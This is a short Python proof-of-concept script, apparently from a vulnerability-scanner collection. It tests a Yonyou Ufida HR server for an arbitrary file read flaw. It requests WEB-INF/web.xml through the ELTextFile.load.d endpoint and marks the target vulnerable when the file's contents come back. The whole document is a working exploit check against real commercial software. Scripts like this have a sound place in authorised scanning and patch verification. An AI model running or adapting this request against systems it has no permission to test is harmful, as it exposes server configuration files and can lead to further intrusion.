import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友Ufida-ELTextFile.load.d任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/hrss/ELTextFile.load.d?src=WEB-INF/web.xml")
    try:
        response = requests.post(vurl, headers=headers)
        if response.status_code == 200 and 'web-app' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult